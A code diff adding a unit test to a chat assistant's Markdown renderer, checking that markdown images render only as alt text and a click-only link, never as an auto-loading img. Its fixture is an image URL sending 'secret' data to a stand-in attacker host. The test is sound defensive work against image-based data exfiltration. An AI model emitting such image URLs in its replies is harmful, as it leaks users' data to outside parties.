@@ -12,6 +12,16 @@ import { render, screen } from '@testing-library/react';
 import { Markdown, isInAppHref } from '@/component-library/features/assistant/Markdown';
 
 describe('Markdown', () => {
+    it('never renders an img element for markdown images, only alt text and a click-only link', () => {
+        const { container } = render(<Markdown text={'![the alt](https://evil.example/p?d=secret) and ![](/local.png)'} />);
+        expect(container.querySelector('img')).toBeNull();
+        const link = screen.getByText('the alt').closest('a');
+        expect(link).toHaveAttribute('href', 'https://evil.example/p?d=secret');
+        expect(link).toHaveAttribute('target', '_blank');
+        expect(link).toHaveAttribute('rel', 'noopener noreferrer');
+        expect(container.querySelector('[src]')).toBeNull();
+    });
+
     it('renders GFM tables and strikethrough', () => {
         const { container } = render(<Markdown text={'| state | count |\n|---|---|\n| STUCK | 3 |\n\n~~old~~'} />);
         expect(container.querySelector('table')).not.toBeNull();
